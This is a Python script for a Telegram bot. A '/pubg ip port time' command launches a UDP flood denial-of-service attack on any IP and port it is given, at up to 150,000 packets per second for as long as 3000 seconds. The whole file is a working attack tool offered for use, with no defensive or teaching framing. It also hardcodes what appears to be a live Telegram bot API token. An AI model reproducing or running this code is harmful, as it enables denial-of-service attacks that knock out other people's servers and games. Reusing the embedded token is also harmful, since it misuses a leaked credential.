import asyncio
import argparse
import socket
import string
import telebot
import threading
import time

# Telegram bot API token
telegram_bot_token = "7019537527:AAHbP57Qajk-Mm_Pn_b5PzkC_1HBLCRQ6Dk"

# Maximum attack duration (in seconds)
MAX_DURATION = 3000

# Maximum number of requests per second
MAX_REQUESTS_PER_SECOND = 150000

async def udp_flood(target_ip, target_port, duration, chat_id):
    # Ensure that the attack duration does not exceed the maximum limit
    duration = min(duration, MAX_DURATION)

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Generate random payload
    payload = "A" * 1024

    # Calculate end time for the attack
    end_time = time.time() + duration

    # Start sending UDP packets asynchronously
    while time.time() < end_time:
        # Send multiple packets concurrently using asyncio
        await asyncio.gather(*[send_packet(sock, target_ip, target_port, payload) for _ in range(MAX_REQUESTS_PER_SECOND)])

    sock.close()

    # Notify user that the attack has ended
    bot.send_message(chat_id, "UDP flood attack ended.")

async def send_packet(sock, target_ip, target_port, payload):
    # Send a UDP packet
    sock.sendto(payload.encode(), (target_ip, target_port))

# Create a Telegram bot
bot = telebot.TeleBot(telegram_bot_token)

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Bot started. Use /pubg ip port time to initiate the UDP flood attack.")

@bot.message_handler(commands=['pubg'])
def pubg(message):
    # Parse command arguments
    try:
        _, ip, port, time = message.text.split()
        target_ip = ip.strip()
        target_port = int(port.strip())
        duration = int(time.strip())
    except ValueError:
        bot.reply_to(message, "Invalid command format. Use /pubg ip port time.")
        return

    # Ensure that the attack duration does not exceed the maximum limit
    duration = min(duration, MAX_DURATION)

    # Initiate UDP flood attack in a separate thread
    threading.Thread(target=asyncio.run, args=(udp_flood(target_ip, target_port, duration, message.chat.id),)).start()

    bot.reply_to(message, "UDP flood attack initiated.")

# Start the bot
bot.polling()
